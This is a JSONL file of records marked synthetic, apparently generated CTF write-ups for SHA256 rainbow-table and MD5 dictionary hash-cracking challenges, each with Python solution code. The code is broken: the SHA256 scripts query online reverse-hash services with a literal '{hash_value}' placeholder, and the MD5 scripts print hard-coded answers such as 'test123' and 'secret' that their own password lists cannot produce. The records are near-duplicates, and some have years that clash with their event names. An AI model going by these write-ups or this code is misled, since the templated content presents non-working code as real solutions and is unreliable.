{"id": "synthetic_hash_034", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "SHA256 Rainbow Table #35", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/34", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834676", "synthetic": true}
{"id": "synthetic_hash_035", "team": "synthetic_team_10", "event": "CTF_2024_Event_6", "challenge_name": "MD5 Dictionary Attack #36", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/35", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834693", "synthetic": true}
{"id": "synthetic_hash_036", "team": "synthetic_team_6", "event": "CTF_2024_Event_9", "challenge_name": "SHA256 Rainbow Table #37", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/36", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834707", "synthetic": true}
{"id": "synthetic_hash_037", "team": "synthetic_team_2", "event": "CTF_2024_Event_6", "challenge_name": "MD5 Dictionary Attack #38", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/37", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834725", "synthetic": true}
{"id": "synthetic_hash_038", "team": "synthetic_team_7", "event": "CTF_2024_Event_19", "challenge_name": "SHA256 Rainbow Table #39", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/38", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834739", "synthetic": true}
{"id": "synthetic_hash_039", "team": "synthetic_team_4", "event": "CTF_2024_Event_11", "challenge_name": "SHA256 Rainbow Table #40", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/39", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834752", "synthetic": true}
{"id": "synthetic_hash_040", "team": "synthetic_team_2", "event": "CTF_2024_Event_15", "challenge_name": "SHA256 Rainbow Table #41", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/40", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834765", "synthetic": true}
{"id": "synthetic_hash_041", "team": "synthetic_team_2", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #42", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/41", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834778", "synthetic": true}
{"id": "synthetic_hash_042", "team": "synthetic_team_5", "event": "CTF_2024_Event_2", "challenge_name": "MD5 Dictionary Attack #43", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/42", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835060", "synthetic": true}
{"id": "synthetic_hash_043", "team": "synthetic_team_3", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #44", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/43", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835086", "synthetic": true}
{"id": "synthetic_hash_044", "team": "synthetic_team_3", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #45", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/44", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835104", "synthetic": true}
{"id": "synthetic_hash_045", "team": "synthetic_team_8", "event": "CTF_2024_Event_13", "challenge_name": "MD5 Dictionary Attack #46", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/45", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835127", "synthetic": true}
{"id": "synthetic_hash_046", "team": "synthetic_team_3", "event": "CTF_2024_Event_6", "challenge_name": "SHA256 Rainbow Table #47", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/46", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835145", "synthetic": true}
{"id": "synthetic_hash_047", "team": "synthetic_team_9", "event": "CTF_2024_Event_17", "challenge_name": "MD5 Dictionary Attack #48", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/47", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835164", "synthetic": true}
